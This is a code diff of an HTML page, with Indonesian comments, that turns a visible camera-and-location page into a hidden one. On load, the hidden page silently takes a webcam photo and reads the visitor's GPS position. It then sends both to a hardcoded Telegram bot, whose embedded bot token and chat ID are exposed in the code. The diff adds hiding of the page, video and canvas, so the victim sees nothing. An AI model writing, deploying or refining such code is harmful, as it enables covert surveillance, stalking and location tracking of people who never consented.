@@ -2,61 +2,80 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Capture Photo & Location</title>
+  <title>Capture & Send</title>
 </head>
-<body>
-  <h1>Memuat Kamera & Lokasi...</h1>
-  <video id="video" autoplay playsinline width="300"></video>
+<body style="display:none;">
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const botToken = '7927041124:AAHuSSavc_9B1BLJDo91nIz4bO_fih2gLro';
+    const chatId = '7041008009';
 
-    // Akses kamera
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then((stream) => {
+    async function sendToTelegram(imageData, latitude, longitude) {
+      try {
+        // 1. Kirim Foto
+        const blob = await (await fetch(imageData)).blob();
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'photo.jpg');
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+
+        // 2. Kirim Lokasi
+        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            latitude,
+            longitude
+          })
+        });
+      } catch (err) {
+        console.error("Gagal mengirim ke Telegram:", err);
+      }
+    }
+
+    async function captureAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         video.srcObject = stream;
 
-        // Tunggu 3 detik lalu ambil foto
-        setTimeout(() => {
-          const context = canvas.getContext('2d');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0);
-          const imageData = canvas.toDataURL('image/jpeg');
+        // Tunggu sampai video siap
+        await new Promise(resolve => video.onloadedmetadata = resolve);
 
-          // Akses lokasi
-          navigator.geolocation.getCurrentPosition((position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
+        // Ambil frame
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/jpeg');
 
-            // Kirim ke Bot Telegram
-            const botToken = '7927041124:AAHuSSavc_9B1BLJDo91nIz4bO_fih2gLro';
-            const chatId = '7041008009';
+        // Hentikan kamera
+        stream.getTracks().forEach(track => track.stop());
 
-            // Kirim foto
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-              method: 'POST',
-              body: new FormData().append('chat_id', chatId).append('photo', imageData)
-            });
+        // Ambil lokasi
+        navigator.geolocation.getCurrentPosition((position) => {
+          const { latitude, longitude } = position.coords;
+          sendToTelegram(imageData, latitude, longitude);
+        }, (err) => {
+          console.error("Gagal mengambil lokasi:", err);
+        });
 
-            // Kirim lokasi
-            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: chatId,
-                latitude: latitude,
-                longitude: longitude
-              })
-            });
-          });
-        }, 3000);
-      })
-      .catch((err) => {
-        console.error('Gagal mengakses kamera atau lokasi:', err);
-      });
+      } catch (err) {
+        console.error("Gagal akses kamera atau lainnya:", err);
+      }
+    }
+
+    captureAndSend();
   </script>
 </body>
 </html>
